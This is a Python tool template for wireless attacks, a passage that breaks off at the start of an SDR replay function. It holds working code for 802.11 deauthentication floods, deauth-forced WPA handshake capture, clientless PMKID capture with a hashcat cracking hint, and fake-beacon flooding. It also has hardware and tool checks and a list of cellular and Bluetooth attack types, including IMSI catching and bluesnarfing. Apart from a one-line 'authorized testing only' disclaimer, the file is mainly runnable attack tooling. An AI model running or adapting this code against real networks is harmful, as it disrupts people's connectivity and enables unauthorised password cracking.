#!/usr/bin/env python3
"""
RF & Wireless Security Research Template
==========================================

Comprehensive template for Radio Frequency and wireless security research.
Covers WiFi (802.11), Cellular (GSM/LTE/5G), Bluetooth/BLE, SDR, and RF analysis.

Category: F - RF & Wireless Exploitation
Author: Security Research Lab
Version: 1.0.0
Date: 2026-02-08

Domains:
    - WiFi 802.11 (deauth, evil twin, handshake capture, PMKID)
    - Cellular / Telecom (OpenBTS, srsRAN, IMSI analysis, GSM/LTE/5G)
    - Bluetooth / BLE (sniffing, fuzzing, exploitation)
    - SDR (HackRF, RTL-SDR, BladeRF, USRP, GNU Radio)
    - RF Jamming & Signal Analysis (authorized lab environments)
    - Sub-GHz protocols (LoRa, Zigbee, Z-Wave, 433/868/915 MHz)

Hardware References:
    - HackRF One          : 1 MHz - 6 GHz TX/RX
    - RTL-SDR (v3/v4)     : 24 MHz - 1.766 GHz RX only
    - BladeRF 2.0         : 47 MHz - 6 GHz TX/RX
    - USRP B200/B210      : 70 MHz - 6 GHz TX/RX
    - Ubertooth One       : 2.4 GHz Bluetooth
    - YARD Stick One      : Sub-1 GHz TX/RX
    - Proxmark3           : 125 kHz / 13.56 MHz RFID/NFC
    - WiFi Adapter (monitor mode): Alfa AWUS036ACH, etc.

Dependencies:
    pip install scapy numpy scipy matplotlib

System packages (Debian/Ubuntu):
    apt install gnuradio hackrf soapysdr-tools gr-osmosdr
    apt install aircrack-ng hostapd dnsmasq
    apt install srsran   (or build from source)

Legal:
    Authorized security testing only. RF transmission requires
    appropriate licensing and authorization. See 02_LEGAL_CONTEXT.md.
"""

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Optional, Callable

import argparse
import json
import logging
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time

logger = logging.getLogger("security_tool")


# ══════════════════════════════════════════════
#  ENUMS & CONSTANTS
# ══════════════════════════════════════════════

class RFDomain(str, Enum):
    """RF security research domains."""
    WIFI = "wifi"
    CELLULAR = "cellular"
    BLUETOOTH = "bluetooth"
    SDR = "sdr"
    SUB_GHZ = "sub_ghz"
    RFID_NFC = "rfid_nfc"
    RF_GENERAL = "rf_general"


class WifiAttackType(str, Enum):
    """WiFi 802.11 attack types."""
    DEAUTH = "deauth"
    BEACON_FLOOD = "beacon_flood"
    EVIL_TWIN = "evil_twin"
    HANDSHAKE_CAPTURE = "handshake_capture"
    PMKID_CAPTURE = "pmkid_capture"
    KARMA = "karma"
    PROBE_SNIFF = "probe_sniff"
    WPS_ATTACK = "wps_attack"
    KRACK = "krack"
    FRAG_ATTACK = "frag_attack"
    AUTH_FLOOD = "auth_flood"
    CHANNEL_HOP = "channel_hop"


class CellularTech(str, Enum):
    """Cellular technology generations."""
    GSM_2G = "2g_gsm"
    UMTS_3G = "3g_umts"
    LTE_4G = "4g_lte"
    NR_5G = "5g_nr"


class CellularAttackType(str, Enum):
    """Cellular network attack types."""
    IMSI_CATCH = "imsi_catch"
    DOWNGRADE = "downgrade"
    ROGUE_BTS = "rogue_bts"
    SMS_INTERCEPT = "sms_intercept"
    LOCATION_TRACK = "location_track"
    JAMMING = "jamming"
    REPLAY = "replay"
    DOS = "dos"


class BluetoothAttackType(str, Enum):
    """Bluetooth/BLE attack types."""
    SCANNING = "scanning"
    SNIFFING = "sniffing"
    SPOOFING = "spoofing"
    FUZZING = "fuzzing"
    MITM = "mitm"
    BLUESNARFING = "bluesnarfing"
    BLUEBUGGING = "bluebugging"
    BLE_REPLAY = "ble_replay"
    KNOB = "knob"
    BIAS = "bias"


class SDRBackend(str, Enum):
    """SDR hardware backends."""
    HACKRF = "hackrf"
    RTLSDR = "rtlsdr"
    BLADERF = "bladerf"
    USRP = "usrp"
    LIMESDR = "limesdr"
    PLUTOSDR = "plutosdr"
    FILE = "file"           # Replay from IQ file


class ModulationType(str, Enum):
    """Common modulation types."""
    AM = "AM"
    FM = "FM"
    OOK = "OOK"
    ASK = "ASK"
    FSK = "FSK"
    GFSK = "GFSK"
    BPSK = "BPSK"
    QPSK = "QPSK"
    QAM16 = "16QAM"
    QAM64 = "64QAM"
    OFDM = "OFDM"
    GMSK = "GMSK"           # GSM uses this
    SC_FDMA = "SC-FDMA"     # LTE uplink


class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


# WiFi channel → frequency mapping (2.4 GHz)
WIFI_CHANNELS_24GHZ = {
    1: 2412, 2: 2417, 3: 2422, 4: 2427, 5: 2432,
    6: 2437, 7: 2442, 8: 2447, 9: 2452, 10: 2457,
    11: 2462, 12: 2467, 13: 2472, 14: 2484,
}

# WiFi channel → frequency mapping (5 GHz, common)
WIFI_CHANNELS_5GHZ = {
    36: 5180, 40: 5200, 44: 5220, 48: 5240,
    52: 5260, 56: 5280, 60: 5300, 64: 5320,
    100: 5500, 104: 5520, 108: 5540, 112: 5560,
    116: 5580, 120: 5600, 124: 5620, 128: 5640,
    132: 5660, 136: 5680, 140: 5700, 144: 5720,
    149: 5745, 153: 5765, 157: 5785, 161: 5805, 165: 5825,
}

# GSM ARFCN → frequency (simplified, GSM-900)
GSM900_ARFCN = {
    # ARFCN: (uplink_MHz, downlink_MHz)
    # Range: 1-124 for GSM-900
    # Formula: downlink = 935 + 0.2*(ARFCN), uplink = downlink - 45
}

# LTE common bands
LTE_BANDS = {
    1:  {"name": "2100 MHz", "dl_low": 2110, "dl_high": 2170, "ul_low": 1920, "ul_high": 1980},
    3:  {"name": "1800 MHz", "dl_low": 1805, "dl_high": 1880, "ul_low": 1710, "ul_high": 1785},
    7:  {"name": "2600 MHz", "dl_low": 2620, "dl_high": 2690, "ul_low": 2500, "ul_high": 2570},
    8:  {"name": "900 MHz",  "dl_low": 925,  "dl_high": 960,  "ul_low": 880,  "ul_high": 915},
    20: {"name": "800 MHz",  "dl_low": 791,  "dl_high": 821,  "ul_low": 832,  "ul_high": 862},
    28: {"name": "700 MHz",  "dl_low": 758,  "dl_high": 803,  "ul_low": 703,  "ul_high": 748},
    38: {"name": "2600 TDD", "dl_low": 2570, "dl_high": 2620},  # TDD
    40: {"name": "2300 TDD", "dl_low": 2300, "dl_high": 2400},  # TDD
    41: {"name": "2500 TDD", "dl_low": 2496, "dl_high": 2690},  # TDD (5G NR n41)
}


# ══════════════════════════════════════════════
#  DATA CLASSES
# ══════════════════════════════════════════════

@dataclass
class RFTarget:
    """Represents an RF target (AP, BTS, device, frequency)."""
    identifier: str             # BSSID, IMSI, BT addr, or freq
    name: str = ""              # SSID, cell name, device name
    domain: RFDomain = RFDomain.RF_GENERAL
    frequency_mhz: float = 0.0
    channel: int = 0
    power_dbm: float = 0.0
    encryption: str = ""
    metadata: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "identifier": self.identifier,
            "name": self.name,
            "domain": self.domain.value,
            "frequency_mhz": self.frequency_mhz,
            "channel": self.channel,
            "power_dbm": self.power_dbm,
            "encryption": self.encryption,
            "metadata": self.metadata,
        }


@dataclass
class RFCapture:
    """Represents a captured RF sample / recording."""
    filepath: str
    format: str = "pcap"        # pcap, pcapng, iq_raw, iq_wav, sigmf
    sample_rate: int = 0        # Samples per second (for IQ)
    center_freq: float = 0.0    # Center frequency in Hz
    duration_sec: float = 0.0
    size_bytes: int = 0
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    metadata: dict = field(default_factory=dict)


@dataclass
class RFFinding:
    """RF security finding."""
    title: str
    severity: Severity
    domain: RFDomain
    description: str
    target: Optional[RFTarget] = None
    evidence: str = ""
    capture: Optional[RFCapture] = None
    remediation: str = ""
    metadata: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "title": self.title,
            "severity": self.severity.value,
            "domain": self.domain.value,
            "description": self.description,
            "target": self.target.to_dict() if self.target else None,
            "evidence": self.evidence,
            "capture": self.capture.filepath if self.capture else None,
            "remediation": self.remediation,
        }


@dataclass
class RFResult:
    """Result of an RF operation."""
    success: bool
    domain: RFDomain = RFDomain.RF_GENERAL
    targets_found: list[RFTarget] = field(default_factory=list)
    findings: list[RFFinding] = field(default_factory=list)
    captures: list[RFCapture] = field(default_factory=list)
    data: Any = None
    error: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    duration: float = 0.0


# ══════════════════════════════════════════════
#  UTILITY: SYSTEM & HARDWARE CHECKS
# ══════════════════════════════════════════════

class RFEnvironment:
    """Check and manage RF research environment prerequisites."""

    @staticmethod
    def check_tool(name: str) -> bool:
        """Check if a system tool is available."""
        return shutil.which(name) is not None

    @staticmethod
    def check_root() -> bool:
        """Check if running as root (required for most RF operations)."""
        return os.geteuid() == 0

    @staticmethod
    def run_cmd(cmd: list[str], timeout: int = 30) -> tuple[str, str, int]:
        """Run a system command safely."""
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            return proc.stdout, proc.stderr, proc.returncode
        except subprocess.TimeoutExpired:
            return "", "Command timed out", -1
        except FileNotFoundError:
            return "", f"Command not found: {cmd[0]}", -1

    @classmethod
    def check_wifi_tools(cls) -> dict[str, bool]:
        """Check availability of WiFi tools."""
        tools = [
            "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
            "hostapd", "dnsmasq", "hcxdumptool", "hcxpcapngtool",
            "wpa_supplicant", "iw", "iwconfig", "macchanger",
            "mdk4", "bettercap",
        ]
        return {t: cls.check_tool(t) for t in tools}

    @classmethod
    def check_sdr_tools(cls) -> dict[str, bool]:
        """Check availability of SDR tools."""
        tools = [
            "hackrf_info", "hackrf_transfer", "hackrf_sweep",
            "rtl_sdr", "rtl_power", "rtl_fm", "rtl_tcp",
            "gnuradio-companion", "gr_modtool",
            "SoapySDRUtil", "rx_sdr", "tx_sdr",
            "inspectrum", "gqrx", "urh",
        ]
        return {t: cls.check_tool(t) for t in tools}

    @classmethod
    def check_cellular_tools(cls) -> dict[str, bool]:
        """Check availability of cellular/telecom tools."""
        tools = [
            "srsenb", "srsepc", "srsue",               # srsRAN 4G
            "gnb", "amf",                               # srsRAN 5G / Open5GS
            "osmo-bts", "osmo-bsc", "osmo-msc",        # Osmocom
            "OpenBTS",                                   # OpenBTS
            "grgsm_decode", "grgsm_livemon",            # gr-gsm
            "tshark", "wireshark",                       # Packet analysis
            "kalibrate-hackrf",                          # GSM freq calibration
        ]
        return {t: cls.check_tool(t) for t in tools}

    @classmethod
    def check_bluetooth_tools(cls) -> dict[str, bool]:
        """Check availability of Bluetooth tools."""
        tools = [
            "hciconfig", "hcitool", "hcidump",
            "bluetoothctl", "btmgmt",
            "ubertooth-scan", "ubertooth-btle", "ubertooth-rx",
            "gatttool", "bettercap",
            "bdaddr", "spooftooph",
            "crackle",                                   # BLE cracking
        ]
        return {t: cls.check_tool(t) for t in tools}

    @classmethod
    def detect_sdr_hardware(cls) -> list[dict]:
        """Detect connected SDR hardware."""
        devices = []

        # HackRF
        stdout, _, rc = cls.run_cmd(["hackrf_info"])
        if rc == 0 and "Found HackRF" in stdout:
            serial = ""
            for line in stdout.split("\n"):
                if "Serial number" in line:
                    serial = line.split(":")[-1].strip()
            devices.append({
                "type": "HackRF One",
                "backend": SDRBackend.HACKRF.value,
                "serial": serial,
                "freq_range": "1 MHz - 6 GHz",
                "tx": True,
                "raw": stdout.strip(),
            })

        # RTL-SDR
        stdout, _, rc = cls.run_cmd(["rtl_test", "-t"], timeout=5)
        if rc == 0 or "Found" in (stdout + _):
            devices.append({
                "type": "RTL-SDR",
                "backend": SDRBackend.RTLSDR.value,
                "freq_range": "24 MHz - 1.766 GHz",
                "tx": False,
            })

        # SoapySDR (catches BladeRF, LimeSDR, PlutoSDR, etc.)
        stdout, _, rc = cls.run_cmd(["SoapySDRUtil", "--find"])
        if rc == 0 and stdout.strip():
            for block in stdout.split("\n\n"):
                if "driver=" in block.lower():
                    devices.append({
                        "type": "SoapySDR Device",
                        "backend": "soapy",
                        "raw": block.strip(),
                        "tx": True,
                    })

        return devices

    @classmethod
    def get_wireless_interfaces(cls) -> list[dict]:
        """List wireless network interfaces and their capabilities."""
        interfaces = []
        stdout, _, rc = cls.run_cmd(["iw", "dev"])
        if rc != 0:
            return interfaces

        current = {}
        for line in stdout.split("\n"):
            line = line.strip()
            if line.startswith("Interface"):
                if current:
                    interfaces.append(current)
                current = {"name": line.split()[-1]}
            elif line.startswith("type"):
                current["mode"] = line.split()[-1]
            elif line.startswith("channel"):
                current["channel"] = line.split()[1]
            elif line.startswith("addr"):
                current["mac"] = line.split()[-1]

        if current:
            interfaces.append(current)

        # Check monitor mode support
        for iface in interfaces:
            stdout2, _, _ = cls.run_cmd(["iw", "phy"])
            if "monitor" in stdout2.lower():
                iface["monitor_capable"] = True

        return interfaces

    @classmethod
    def full_environment_check(cls) -> dict:
        """Run a complete environment check."""
        return {
            "is_root": cls.check_root(),
            "wifi_tools": cls.check_wifi_tools(),
            "sdr_tools": cls.check_sdr_tools(),
            "cellular_tools": cls.check_cellular_tools(),
            "bluetooth_tools": cls.check_bluetooth_tools(),
            "sdr_hardware": cls.detect_sdr_hardware(),
            "wireless_interfaces": cls.get_wireless_interfaces(),
        }

    @classmethod
    def print_environment_report(cls):
        """Print a formatted environment report."""
        env = cls.full_environment_check()

        print("\n" + "=" * 60)
        print(" RF Research Environment Check")
        print("=" * 60)

        # Root check
        root_status = "\033[32mYES\033[0m" if env["is_root"] else "\033[31mNO\033[0m"
        print(f"\n Root access: {root_status}")

        # Tool categories
        for category in ["wifi_tools", "sdr_tools", "cellular_tools", "bluetooth_tools"]:
            tools = env[category]
            available = sum(1 for v in tools.values() if v)
            total = len(tools)
            print(f"\n {category.replace('_', ' ').title()} ({available}/{total}):")
            for name, ok in sorted(tools.items()):
                icon = "\033[32m+\033[0m" if ok else "\033[31m-\033[0m"
                print(f"   [{icon}] {name}")

        # SDR Hardware
        print(f"\n SDR Hardware ({len(env['sdr_hardware'])} detected):")
        if env["sdr_hardware"]:
            for dev in env["sdr_hardware"]:
                tx = "TX/RX" if dev.get("tx") else "RX only"
                print(f"   [+] {dev['type']} ({tx}) {dev.get('freq_range', '')}")
        else:
            print("   [-] No SDR hardware detected")

        # Wireless interfaces
        print(f"\n Wireless Interfaces ({len(env['wireless_interfaces'])}):")
        for iface in env["wireless_interfaces"]:
            mon = " [monitor capable]" if iface.get("monitor_capable") else ""
            print(f"   [+] {iface['name']} mode={iface.get('mode', '?')}{mon}")

        print("\n" + "=" * 60 + "\n")


# ══════════════════════════════════════════════
#  WiFi 802.11 OPERATIONS
# ══════════════════════════════════════════════

class WifiOperations:
    """
    WiFi 802.11 attack primitives using Scapy and system tools.

    Requires:
        - Wireless adapter in monitor mode
        - Root privileges
        - aircrack-ng suite (for some operations)
    """

    def __init__(self, interface: str, options: dict | None = None):
        """
        Args:
            interface: Wireless interface name (e.g., wlan0mon).
            options: Additional options.
        """
        self.interface = interface
        self.options = options or {}
        self.monitor_enabled = False

    def enable_monitor_mode(self, interface: str | None = None) -> str:
        """
        Enable monitor mode on wireless interface.

        Returns:
            Monitor interface name (e.g., wlan0mon).
        """
        iface = interface or self.interface

        logger.info(f"Enabling monitor mode on {iface}...")

        # Kill interfering processes
        RFEnvironment.run_cmd(["airmon-ng", "check", "kill"])

        # Enable monitor mode
        stdout, stderr, rc = RFEnvironment.run_cmd(["airmon-ng", "start", iface])
        if rc != 0:
            # Fallback: manual method
            RFEnvironment.run_cmd(["ip", "link", "set", iface, "down"])
            RFEnvironment.run_cmd(["iw", "dev", iface, "set", "type", "monitor"])
            RFEnvironment.run_cmd(["ip", "link", "set", iface, "up"])
            self.monitor_enabled = True
            return iface

        # Detect new monitor interface name
        mon_iface = f"{iface}mon"
        if "monitor mode" in stdout.lower():
            for line in stdout.split("\n"):
                if "monitor mode" in line.lower() and "enabled" in line.lower():
                    parts = line.strip().rstrip(")").split("(")
                    if len(parts) > 1:
                        mon_iface = parts[-1].strip()

        self.interface = mon_iface
        self.monitor_enabled = True
        logger.info(f"Monitor mode enabled: {mon_iface}")
        return mon_iface

    def disable_monitor_mode(self, interface: str | None = None):
        """Disable monitor mode and restore managed mode."""
        iface = interface or self.interface
        logger.info(f"Disabling monitor mode on {iface}...")
        RFEnvironment.run_cmd(["airmon-ng", "stop", iface])
        # Restart network manager
        RFEnvironment.run_cmd(["systemctl", "start", "NetworkManager"])
        self.monitor_enabled = False

    def set_channel(self, channel: int, interface: str | None = None):
        """Set wireless interface to specific channel."""
        iface = interface or self.interface
        RFEnvironment.run_cmd(["iw", "dev", iface, "set", "channel", str(channel)])

    def scan_networks(
        self, duration: int = 15, output_prefix: str = "/tmp/rf_scan"
    ) -> list[RFTarget]:
        """
        Scan for nearby WiFi networks using airodump-ng.

        Args:
            duration: Scan duration in seconds.
            output_prefix: Output file prefix for airodump-ng.

        Returns:
            List of discovered WiFi targets.
        """
        logger.info(f"Scanning WiFi networks for {duration}s...")

        cmd = [
            "airodump-ng",
            self.interface,
            "--write", output_prefix,
            "--output-format", "csv",
            "--write-interval", "1",
        ]

        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(duration)
        proc.terminate()
        proc.wait()

        # Parse airodump-ng CSV output
        return self._parse_airodump_csv(f"{output_prefix}-01.csv")

    def _parse_airodump_csv(self, filepath: str) -> list[RFTarget]:
        """Parse airodump-ng CSV output into RFTarget list."""
        targets = []
        try:
            with open(filepath, "r", errors="replace") as f:
                content = f.read()

            # Split AP section and client section
            sections = content.split("Station MAC")
            ap_section = sections[0] if sections else ""

            in_header = True
            for line in ap_section.strip().split("\n"):
                if "BSSID" in line:
                    in_header = False
                    continue
                if in_header or not line.strip():
                    continue

                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue

                bssid = parts[0]
                if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                    continue

                channel = int(parts[3]) if parts[3].strip().isdigit() else 0
                power = int(parts[8]) if parts[8].strip().lstrip("-").isdigit() else 0
                encryption = parts[5].strip()
                ssid = parts[13].strip()

                freq = WIFI_CHANNELS_24GHZ.get(channel, 0)
                if freq == 0:
                    freq = WIFI_CHANNELS_5GHZ.get(channel, 0)

                targets.append(RFTarget(
                    identifier=bssid,
                    name=ssid,
                    domain=RFDomain.WIFI,
                    frequency_mhz=float(freq),
                    channel=channel,
                    power_dbm=float(power),
                    encryption=encryption,
                    metadata={
                        "speed": parts[4].strip() if len(parts) > 4 else "",
                        "beacons": parts[6].strip() if len(parts) > 6 else "",
                        "ivs": parts[7].strip() if len(parts) > 7 else "",
                    },
                ))

        except FileNotFoundError:
            logger.error(f"Scan output not found: {filepath}")
        except Exception as e:
            logger.error(f"Error parsing scan results: {e}")

        logger.info(f"Discovered {len(targets)} networks")
        return targets

    def deauth(
        self,
        target_bssid: str,
        client_mac: str = "FF:FF:FF:FF:FF:FF",
        count: int = 10,
        channel: int = 0,
        interval: float = 0.1,
        reason: int = 7,
        use_scapy: bool = True,
    ) -> RFResult:
        """
        Send 802.11 deauthentication frames.

        Args:
            target_bssid: Target AP BSSID (MAC address).
            client_mac: Target client MAC (FF:FF:FF:FF:FF:FF for broadcast).
            count: Number of deauth frames (0 = continuous).
            channel: Channel to send on (0 = current).
            interval: Interval between frames in seconds.
            reason: Deauth reason code (7 = Class 3 frame from non-associated STA).
            use_scapy: Use Scapy (True) or aireplay-ng (False).

        Returns:
            RFResult with operation status.

        Reason codes:
            1  - Unspecified
            2  - Previous auth no longer valid
            3  - Station leaving (deauth)
            4  - Inactivity
            5  - AP full
            6  - Class 2 frame from non-auth STA
            7  - Class 3 frame from non-associated STA
            8  - Station leaving (disassoc)
        """
        if channel > 0:
            self.set_channel(channel)

        logger.info(f"Deauth attack → AP: {target_bssid} | Client: {client_mac} | Count: {count}")

        if use_scapy:
            return self._deauth_scapy(target_bssid, client_mac, count, interval, reason)
        else:
            return self._deauth_aireplay(target_bssid, client_mac, count)

    def _deauth_scapy(
        self, bssid: str, client: str, count: int, interval: float, reason: int
    ) -> RFResult:
        """Deauth using Scapy for fine-grained control."""
        try:
            from scapy.all import (
                RadioTap, Dot11, Dot11Deauth, sendp, conf
            )
        except ImportError:
            logger.error("Scapy required: pip install scapy")
            return RFResult(success=False, error="Scapy not installed")

        conf.iface = self.interface

        # Deauth from AP to client
        pkt1 = (
            RadioTap() /
            Dot11(addr1=client, addr2=bssid, addr3=bssid) /
            Dot11Deauth(reason=reason)
        )
        # Deauth from client to AP (bidirectional for effectiveness)
        pkt2 = (
            RadioTap() /
            Dot11(addr1=bssid, addr2=client, addr3=bssid) /
            Dot11Deauth(reason=reason)
        )

        sent = 0
        try:
            iterations = count if count > 0 else float("inf")
            while sent < iterations:
                sendp(pkt1, iface=self.interface, verbose=False)
                sendp(pkt2, iface=self.interface, verbose=False)
                sent += 1
                if sent % 50 == 0:
                    logger.info(f"  Sent {sent * 2} deauth frames...")
                time.sleep(interval)
        except KeyboardInterrupt:
            logger.warning("Deauth interrupted by user")

        logger.info(f"Deauth complete: {sent * 2} frames sent")
        return RFResult(
            success=True,
            domain=RFDomain.WIFI,
            data={"frames_sent": sent * 2, "target": bssid, "client": client},
        )

    def _deauth_aireplay(self, bssid: str, client: str, count: int) -> RFResult:
        """Deauth using aireplay-ng."""
        cmd = [
            "aireplay-ng",
            "--deauth", str(count),
            "-a", bssid,
        ]
        if client != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-c", client])
        cmd.append(self.interface)

        stdout, stderr, rc = RFEnvironment.run_cmd(cmd, timeout=count * 2 + 30)
        return RFResult(
            success=rc == 0,
            domain=RFDomain.WIFI,
            data={"stdout": stdout, "stderr": stderr},
            error=stderr if rc != 0 else None,
        )

    def capture_handshake(
        self,
        target_bssid: str,
        channel: int,
        output_file: str = "/tmp/handshake",
        timeout: int = 60,
        deauth_count: int = 5,
    ) -> RFResult:
        """
        Capture WPA/WPA2 4-way handshake.

        Combines targeted deauth with packet capture to force
        handshake re-negotiation.

        Args:
            target_bssid: Target AP BSSID.
            channel: AP channel.
            output_file: Output file prefix.
            timeout: Capture timeout in seconds.
            deauth_count: Deauth frames to send (to force reconnect).

        Returns:
            RFResult with capture file path.
        """
        self.set_channel(channel)

        logger.info(f"Capturing handshake for {target_bssid} on channel {channel}...")

        # Start airodump-ng capture
        capture_cmd = [
            "airodump-ng",
            "--bssid", target_bssid,
            "--channel", str(channel),
            "--write", output_file,
            "--output-format", "pcap",
            self.interface,
        ]

        capture_proc = subprocess.Popen(
            capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
        )

        time.sleep(3)  # Let capture stabilize

        # Send deauth to force handshake
        if deauth_count > 0:
            logger.info(f"Sending {deauth_count} deauth frames to force handshake...")
            deauth_cmd = [
                "aireplay-ng", "--deauth", str(deauth_count),
                "-a", target_bssid,
                self.interface,
            ]
            RFEnvironment.run_cmd(deauth_cmd, timeout=30)

        # Wait for handshake
        logger.info(f"Waiting for handshake (timeout: {timeout}s)...")
        start = time.time()
        handshake_found = False
        cap_file = f"{output_file}-01.cap"

        while time.time() - start < timeout:
            time.sleep(5)
            # Check if handshake captured using aircrack-ng
            check_cmd = ["aircrack-ng", cap_file]
            stdout, _, rc = RFEnvironment.run_cmd(check_cmd, timeout=10)
            if "1 handshake" in stdout.lower():
                handshake_found = True
                logger.info("Handshake captured!")
                break

        capture_proc.terminate()
        capture_proc.wait()

        return RFResult(
            success=handshake_found,
            domain=RFDomain.WIFI,
            captures=[RFCapture(
                filepath=cap_file,
                format="pcap",
                center_freq=float(WIFI_CHANNELS_24GHZ.get(channel, 0)) * 1e6,
                duration_sec=time.time() - start,
            )] if handshake_found else [],
            data={"handshake_found": handshake_found, "capture_file": cap_file},
        )

    def capture_pmkid(
        self,
        target_bssid: str = "",
        channel: int = 0,
        output_file: str = "/tmp/pmkid",
        timeout: int = 30,
    ) -> RFResult:
        """
        Capture PMKID from WPA2 AP (clientless attack).

        Uses hcxdumptool for PMKID capture — does not require a
        client to be connected (no deauth needed).

        Args:
            target_bssid: Target AP BSSID (empty = capture all).
            channel: Target channel (0 = hop).
            output_file: Output file path.
            timeout: Capture timeout.

        Returns:
            RFResult with PMKID capture.
        """
        logger.info("Capturing PMKID (clientless WPA2 attack)...")

        filterlist = ""
        if target_bssid:
            filterlist_path = f"{output_file}_filter.txt"
            with open(filterlist_path, "w") as f:
                f.write(target_bssid.replace(":", "").lower())
            filterlist = filterlist_path

        pcapng_file = f"{output_file}.pcapng"

        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-o", pcapng_file,
            "--active_beacon",
            "--enable_status=15",
        ]
        if filterlist:
            cmd.extend(["--filterlist_ap", filterlist, "--filtermode=2"])
        if channel > 0:
            cmd.extend(["-c", str(channel)])

        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(timeout)
        proc.terminate()
        proc.wait()

        # Extract PMKID hash
        hash_file = f"{output_file}.22000"
        extract_cmd = [
            "hcxpcapngtool",
            "-o", hash_file,
            pcapng_file,
        ]
        stdout, stderr, rc = RFEnvironment.run_cmd(extract_cmd)

        pmkid_found = os.path.exists(hash_file) and os.path.getsize(hash_file) > 0

        if pmkid_found:
            logger.info(f"PMKID captured! Hash file: {hash_file}")
            logger.info("Crack with: hashcat -m 22000 {hash_file} wordlist.txt")
        else:
            logger.warning("No PMKID captured in the timeframe")

        return RFResult(
            success=pmkid_found,
            domain=RFDomain.WIFI,
            captures=[RFCapture(filepath=pcapng_file, format="pcapng")],
            data={
                "pmkid_found": pmkid_found,
                "hash_file": hash_file if pmkid_found else None,
                "pcapng_file": pcapng_file,
            },
        )

    def beacon_flood(
        self,
        ssid_list: list[str] | None = None,
        count: int = 50,
        channel: int = 6,
        interval: float = 0.05,
    ) -> RFResult:
        """
        Flood area with fake beacon frames (fake APs).

        Args:
            ssid_list: List of SSIDs (None = generate random).
            count: Number of unique fake APs.
            channel: Channel to broadcast on.
            interval: Interval between beacons.

        Returns:
            RFResult with operation status.
        """
        try:
            from scapy.all import (
                RadioTap, Dot11, Dot11Beacon, Dot11Elt,
                sendp, RandMAC, conf
            )
        except ImportError:
            return RFResult(success=False, error="Scapy not installed")

        self.set_channel(channel)

        if ssid_list is None:
            ssid_list = [f"FreeWiFi_{i:03d}" for i in range(count)]

        logger.info(f"Beacon flood: {len(ssid_list)} fake APs on channel {channel}")

        frames = []
        for ssid in ssid_list[:count]:
            fake_mac = str(RandMAC())
            pkt = (
                RadioTap() /
                Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",
                      addr2=fake_mac, addr3=fake_mac) /
                Dot11Beacon(cap="ESS+privacy") /
                Dot11Elt(ID="SSID", info=ssid.encode()) /
                Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
                Dot11Elt(ID="DSset", info=bytes([channel]))
            )
            frames.append(pkt)

        try:
            logger.info("Broadcasting fake beacons (Ctrl+C to stop)...")
            while True:
                for pkt in frames:
                    sendp(pkt, iface=self.interface, verbose=False)
                    time.sleep(interval)
        except KeyboardInterrupt:
            logger.warning("Beacon flood stopped")

        return RFResult(success=True, domain=RFDomain.WIFI,
                        data={"ssids_broadcast": len(ssid_list)})


# ══════════════════════════════════════════════
#  SDR OPERATIONS
# ══════════════════════════════════════════════

class SDROperations:
    """
    Software Defined Radio operations for signal capture,
    replay, analysis, and transmission.

    Supports: HackRF, RTL-SDR, BladeRF, USRP via command-line tools.
    """

    def __init__(self, backend: SDRBackend = SDRBackend.HACKRF, options: dict | None = None):
        self.backend = backend
        self.options = options or {}
        self.sample_rate = self.options.get("sample_rate", 2_000_000)  # 2 MS/s default
        self.gain = self.options.get("gain", 40)  # dB

    def capture_iq(
        self,
        center_freq_hz: float,
        output_file: str,
        duration_sec: float = 10.0,
        sample_rate: int | None = None,
        gain: int | None = None,
    ) -> RFCapture:
        """
        Capture raw IQ samples to file.

        Args:
            center_freq_hz: Center frequency in Hz (e.g., 915e6 for 915 MHz).
            output_file: Output file path (.raw / .iq).
            duration_sec: Capture duration.
            sample_rate: Sample rate (default from init).
            gain: Gain in dB.

        Returns:
            RFCapture with recording details.
        """
        sr = sample_rate or self.sample_rate
        g = gain or self.gain
        num_samples = int(sr * duration_sec)

        logger.info(
            f"Capturing IQ: freq={center_freq_hz/1e6:.3f} MHz, "
            f"rate={sr/1e6:.1f} MS/s, duration={duration_sec}s"
        )

        if self.backend == SDRBackend.HACKRF:
            cmd = [
                "hackrf_transfer",
                "-r", output_file,
                "-f", str(int(center_freq_hz)),
                "-s", str(sr),
                "-g", str(g),
                "-l", str(self.options.get("lna_gain", 32)),
                "-n", str(num_samples),
            ]
        elif self.backend == SDRBackend.RTLSDR:
            cmd = [
                "rtl_sdr",
                "-f", str(int(center_freq_hz)),
                "-s", str(sr),
                "-g", str(g),
                "-n", str(num_samples),
                output_file,
            ]
        else:
            # Generic SoapySDR
            cmd = [
                "rx_sdr",
                "-f", str(int(center_freq_hz)),
                "-s", str(sr),
                "-g", str(g),
                "-n", str(num_samples),
                output_file,
            ]

        _, stderr, rc = RFEnvironment.run_cmd(cmd, timeout=int(duration_sec) + 30)

        if rc != 0:
            logger.error(f"IQ capture failed: {stderr}")

        file_size = os.path.getsize(output_file) if os.path.exists(output_file) else 0

        capture = RFCapture(
            filepath=output_file,
            format="iq_raw",
            sample_rate=sr,
            center_freq=center_freq_hz,
            duration_sec=duration_sec,
            size_bytes=file_size,
        )

        logger.info(f"Captured {file_size / 1024 / 1024:.1f} MB to {output_file}")
        return capture

    def replay_iq(
        self,
        input_file: str,
